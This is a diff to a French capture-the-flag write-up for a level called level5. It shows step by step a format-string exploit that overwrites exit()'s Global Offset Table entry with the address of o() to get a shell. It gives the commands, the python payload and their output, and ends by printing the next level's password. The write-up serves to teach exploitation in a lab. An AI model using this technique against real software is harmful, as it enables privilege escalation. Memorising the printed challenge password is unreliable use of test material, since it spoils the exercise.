@@ -113,7 +113,61 @@
 
 ## Exploit
 
-Ni main() ni n() n'appellent o(), dommage car il nous pop un shell. On remarque également qu'il n'y a pas de return(), uniquement des call à exit() donc impossible de réécrire l'eip.
+Ni main() ni n() n'appellent o(), dommage car il nous pop un shell.
+On remarque également qu'il n'y a pas de return(), uniquement des call à exit() donc inutile de réécrire l'eip on va sortir sans y passer.
+Il va falloir remplacer l'adresse de la fonction exit() dans le Global Offset Table par l'adresse de la fonction o() pour avoir notre shell.
 
-- diff exit() vs _exit() ?
-- modifier exit pour le faire pointer sur o() avec printf ?
+
+- `objdump -R level5`
+ ```
+   OFFSET   TYPE              VALUE
+ 08049814 R_386_GLOB_DAT    __gmon_start__
+ 08049848 R_386_COPY        stdin
+ 08049824 R_386_JUMP_SLOT   printf
+ 08049828 R_386_JUMP_SLOT   _exit
+ 0804982c R_386_JUMP_SLOT   fgets
+ 08049830 R_386_JUMP_SLOT   system
+ 08049834 R_386_JUMP_SLOT   __gmon_start__
+ 08049838 R_386_JUMP_SLOT   exit
+ 0804983c R_386_JUMP_SLOT   __libc_start_main
+ ```
+ - l'adresse d'exit dans le GOT est `08049838`
+- `gdb level5`
+- `info function o`
+  ```
+  All functions matching regular expression "o":
+
+  Non-debugging symbols:
+  0x080483c0  __gmon_start__
+  0x080483c0  __gmon_start__@plt
+  0x08048420  __do_global_dtors_aux
+  0x080484a4  o
+  0x080485a0  __do_global_ctors_aux
+  ```
+  - l'adresse de o() est 0x080484a4
+
+- `python -c 'print "AAAA" + "%x " * 10' | ./level5`
+```
+AAAA200 b7fd1ac0 b7ff37d0 41414141 25207825 78252078 20782520 25207825 78252078 20782520
+```
+- on commence a lire notre format string dans la stack au 4eme argument donné à print, donc on devrait pouvoir accéder à notre adresse:
+  - `python -c 'print"\x38\x98\x04\x08 %4$p"' | ./level5"
+    ```
+    8 0x8049838
+    ```
+
+On va à nouveau se servir du modifier %n pour écrire l'adresse de o() dans l'adresse du exit(), pour ca on va mettre autant de padding que la représentation en int de o(), moins 4 octets pour l'adresse de exit():
+- `python -c 'print"\x38\x98\x04\x08%1$" + str(int(0x080484a4) - 4) + "d%4$n"' > /tmp/exploit`
+- `cat /tmp/exploit - | ./level5`
+  ```
+                                    512
+                  
+  ```
+  - `whoami`
+    ```
+    level6
+    ```
+  - `cat /home/user/level6/.pass`
+    ```
+    d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+    ```
